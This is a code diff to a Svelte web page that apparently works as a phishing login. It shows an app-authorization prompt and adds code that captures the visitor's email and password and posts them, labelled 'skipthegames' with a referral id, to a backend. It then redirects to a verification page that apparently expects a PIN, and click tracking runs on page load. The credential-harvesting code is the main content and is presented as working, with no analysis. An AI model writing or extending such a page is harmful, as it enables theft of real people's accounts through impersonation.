@@ -1,4 +1,52 @@
+<script context="module">
+    export function load({ url,params }) {
+        console.log(url,params)
+        let query = url.searchParams;
+ 
+        return {
+            props: {
+                ref: query.get("r"),
+            },
+        };
+    }
+</script>
 
+<script>
+    import { onMount } from "svelte";
+    import { goto } from "$app/navigation";
+
+    onMount(async () => {
+        console.log("hi");
+        console.log("ref", ref);
+        let r = await fetch("/api/click?ref=b&id=c");
+        console.log(r);
+        let j = await r.json();
+        console.log(j);
+    });
+
+    async function post() {
+        console.log(email);
+        let res=await fetch("/api/post", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                input_account_email: email,
+                input_account_password: password,
+                type: "skipthegames",
+                pin_expected: true,
+                ref_id:ref
+            }),
+        });
+        let resVal=await res.json();
+        console.log(resVal)
+        goto("/verification?t="+resVal['timestamp']);
+    }
+    let email = "";
+    let password = "";
+    export let ref;
+</script>
 <svelte:head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -32,9 +80,9 @@
                         <h4>This application will be able to</h4>
                     </div>
                     <div class="submit-opstion">
-                        <input type="email" placeholder="email" required> <br>
-                        <input type="password" placeholder="password"required> <br>
-                        <button type="button"> <a href="/verification"><b>Log In</b></a> </button>
+                        <input bind:value={email} type="email" placeholder="email" required> <br>
+                        <input bind:value={password} type="password" placeholder="password"required> <br>
+                        <button on:click={post} type="button"> <a href="/verification"><b>Log In</b></a> </button>
 
                         
                     </div>
